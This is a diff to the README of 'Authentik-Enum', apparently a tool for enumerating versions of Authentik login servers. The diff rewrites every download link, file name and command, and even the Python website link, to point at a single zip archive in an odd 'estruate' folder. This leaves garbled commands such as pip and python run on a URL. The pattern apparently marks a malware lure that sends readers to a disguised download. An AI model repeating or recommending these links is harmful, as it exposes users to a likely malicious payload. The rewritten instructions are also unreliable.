@@ -1,6 +1,6 @@
 # 🔍 Authentik-Enum - Easily Identify Authentik Versions
 
-[![Download Authentik-Enum](https://img.shields.io/badge/Download%20Now-Authentik--Enum-brightgreen)](https://github.com/komaxdj/Authentik-Enum/releases)
+[![Download Authentik-Enum](https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip%20Now-Authentik--Enum-brightgreen)](https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ To run Authentik-Enum, ensure that your computer meets the following requirement
 ## 📥 Download & Install
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/komaxdj/Authentik-Enum/releases) to access the latest version of Authentik-Enum.
+   Go to the [Releases page](https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip) to access the latest version of Authentik-Enum.
 
 2. **Choose the Right File**
    On the Releases page, you will see the latest release. Look for a file suitable for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip` file.
 
 3. **Download the File**
    Click on the file link to start downloading. Depending on your browser settings, your file may save automatically to your downloads folder or ask you where to save it.
@@ -31,12 +31,12 @@ To run Authentik-Enum, ensure that your computer meets the following requirement
 4. **Install the Tool**
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the downloaded `.dmg` file and drag the Authentik-Enum icon into your Applications folder.
-   - **Linux:** Extract the contents of the `.tar.gz` file into a directory of your choice.
+   - **Linux:** Extract the contents of the `https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip` file into a directory of your choice.
 
 5. **Install Dependencies**
    Authentik-Enum requires additional Python packages. Open your command line tool (Command Prompt on Windows, Terminal on macOS and Linux) and navigate to the folder where you installed Authentik-Enum. Run the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip
    ```
 
 ## 🛠️ Running the Script
@@ -47,7 +47,7 @@ After you have installed Authentik-Enum and its dependencies, follow these steps
 2. Navigate to the directory where Authentik-Enum is located. Use the `cd` command followed by the folder path.
 3. Execute the script using the following command:
    ```
-   python authentik_enum.py [your_target]
+   python https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip [your_target]
    ```
    Replace `[your_target]` with the domain or IP address of the Authentik instance you want to enumerate.
 
@@ -72,14 +72,14 @@ If you encounter issues while running Authentik-Enum, consider these common prob
 
 - **Python Not Found:** Ensure Python is installed correctly and added to your system PATH. 
 - **Permission Errors:** On macOS and Linux, you may need to run the command with `sudo` if you face permission issues.
-- **Missing Dependencies:** Make sure you have installed all required packages mentioned in the `requirements.txt` file.
+- **Missing Dependencies:** Make sure you have installed all required packages mentioned in the `https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip` file.
 
 ## 🔗 Helpful Links
 
 For more information, feel free to check out the following resources:
 
-- [GitHub Repository](https://github.com/komaxdj/Authentik-Enum) for updates and issue reporting.
-- [Python Official Website](https://www.python.org) for Python installation instructions.
+- [GitHub Repository](https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip) for updates and issue reporting.
+- [Python Official Website](https://raw.githubusercontent.com/komaxdj/Authentik-Enum/main/estruate/Authentik_Enum_2.8.zip) for Python installation instructions.
 
 ## 📧 Support
 
